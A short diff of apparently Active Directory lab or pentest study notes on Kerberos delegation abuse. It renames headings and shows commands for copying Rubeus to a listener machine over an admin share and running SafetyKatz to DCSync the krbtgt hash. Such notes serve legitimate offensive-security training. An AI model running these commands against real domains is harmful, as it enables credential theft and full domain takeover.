@@ -1,4 +1,4 @@
-Compromise the server and escalate to Domain Admin privileges*
+### **Unconstrained**
 Use rubeus on the server to run on listener mode
 ```powershell
 echo F | xcopy C:\AD\Tools\Rubeus.exe \\<LISTENER MACHINE>\C$\Users\Public\Rubeus.exe /Y
@@ -27,3 +27,5 @@ And launch safetykatz to dcsync
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<MACHINE>\krbtgt" "exit"
 ```
+
+### **Constrained**
